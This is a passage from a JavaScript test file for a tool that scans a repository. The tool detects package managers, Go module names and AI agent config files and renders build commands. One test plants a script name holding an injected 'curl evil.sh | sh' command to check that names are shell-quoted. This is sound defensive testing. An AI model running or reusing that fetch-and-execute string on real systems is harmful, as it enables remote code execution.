  assert.deepEqual(get('next'), ['14.2.0', '']);
  assert.deepEqual(get('@trpc/server'), ['11.0.1', '']);
  assert.deepEqual(get('zod'), [null, 'catalog:']); // not in any catalog
});

// -- Misc ----------------------------------------------------------------------

test('Yarn Berry renders `cd <dir> && yarn <script>`; classic keeps --cwd', () => {
  const berry = makeTmp();
  write(berry, 'package.json', pkgJson({ name: 'r', packageManager: 'yarn@4.2.0', workspaces: ['apps/*'] }));
  write(berry, 'yarn.lock', '');
  write(berry, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
  assert.deepEqual(cmds(detect(berry), 'build'), ['cd apps/web && yarn build']);

  const rc = makeTmp();
  write(rc, 'package.json', pkgJson({ name: 'r', workspaces: ['apps/*'] }));
  write(rc, 'yarn.lock', '');
  write(rc, '.yarnrc.yml', 'nodeLinker: node-modules\n');
  write(rc, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
  assert.deepEqual(cmds(detect(rc), 'build'), ['cd apps/web && yarn build']);

  const classic = makeTmp();
  write(classic, 'package.json', pkgJson({ name: 'r', packageManager: 'yarn@1.22.22', workspaces: ['apps/*'] }));
  write(classic, 'yarn.lock', '');
  write(classic, 'apps/web/package.json', pkgJson({ name: 'web', scripts: { build: 'vite build' } }));
  assert.deepEqual(cmds(detect(classic), 'build'), ['yarn --cwd apps/web build']);
});

test('Go module names drop the major-version suffix', () => {
  const chi = makeTmp();
  write(chi, 'go.mod', 'module github.com/go-chi/chi/v5\n\ngo 1.22\n');
  assert.equal(detect(chi).name, 'chi');
  const yaml = makeTmp();
  write(yaml, 'go.mod', 'module gopkg.in/yaml.v3\n\ngo 1.22\n');
  assert.equal(detect(yaml).name, 'yaml.v3');
  const plain = makeTmp();
  write(plain, 'go.mod', 'module example.com/acme/svc\n\ngo 1.22\n');
  assert.equal(detect(plain).name, 'svc');
});

test('agent configs: gemini, codex, kiro, opencode, agents skills, junie and friends', () => {
  const dir = makeTmp();
  write(dir, '.gemini/settings.json', '{}');
  write(dir, '.codex/config.toml', '');
  write(dir, '.kiro/steering/product.md', '');
  write(dir, 'opencode.json', '{}');
  write(dir, '.agents/skills/lint/SKILL.md', '');
  write(dir, '.junie/AGENTS.md', '');
  write(dir, '.zed/settings.json', '{}');
  write(dir, '.continue/rules/a.md', '');
  write(dir, '.roo/rules/b.md', '');
  write(dir, 'AGENTS.override.md', '');
  const r = detect(dir);
  const byPath = Object.fromEntries(r.agentConfigs.map((a) => [a.path, a.tool]));
  assert.deepEqual(byPath, {
    '.agents/skills/lint/SKILL.md': 'agents',
    '.codex/config.toml': 'codex',
    '.continue/rules/a.md': 'continue',
    '.gemini/settings.json': 'gemini',
    '.junie/AGENTS.md': 'junie',
    '.kiro/steering/product.md': 'kiro',
    '.roo/rules/b.md': 'roo',
    '.zed/settings.json': 'zed',
    'AGENTS.override.md': 'codex',
    'opencode.json': 'opencode',
  });
});

test('script names and directories are shell-quoted in rendered commands', () => {
  const dir = makeTmp();
  write(dir, 'package.json', pkgJson({ name: 'r', workspaces: ['apps/*'], scripts: { 'test; curl evil.sh | sh': 'x', build: 'tsc' } }));
  write(dir, 'package-lock.json', '{}');
  write(dir, 'apps/my app/package.json', pkgJson({ name: 'my-app', scripts: { "it's": 'x', 'lint': 'eslint' } }));
  const all = Object.values(detect(dir).commands).flat().map((c) => c.cmd);
  assert.ok(all.includes("npm run 'test; curl evil.sh | sh'"));
  assert.ok(all.includes("npm --prefix 'apps/my app' run lint"));
  assert.ok(all.includes("npm --prefix 'apps/my app' run 'it'\\''s'"));
  assert.ok(all.includes('npm run build'));
  assert.ok(!all.some((c) => c.includes('run test; curl')));
});

test('Makefile targets inside define blocks are not listed', () => {
  const dir = makeTmp();
  write(dir, 'Makefile', 'define MACRO\nbar: baz\n\techo hi\nendef\n\ntest:\n\tgo test ./...\n');
  assert.deepEqual(cmds(detect(dir), 'other'), []);
  assert.deepEqual(cmds(detect(dir), 'test'), ['make test']);
});

test('exports used by other scripts stay available', async () => {
  const mod = await import('../scripts/detect.mjs');
  for (const name of ['detect', 'parseToml', 'classify', 'classifyCommand', 'walk', 'createContext', 'SKIP_DIRS', 'MAX_DEPTH', 'shellQuote']) {
    assert.ok(name in mod, name);
  }
  assert.ok(mod.SKIP_DIRS.has('.yarn') && mod.SKIP_DIRS.has('node_modules'));
});
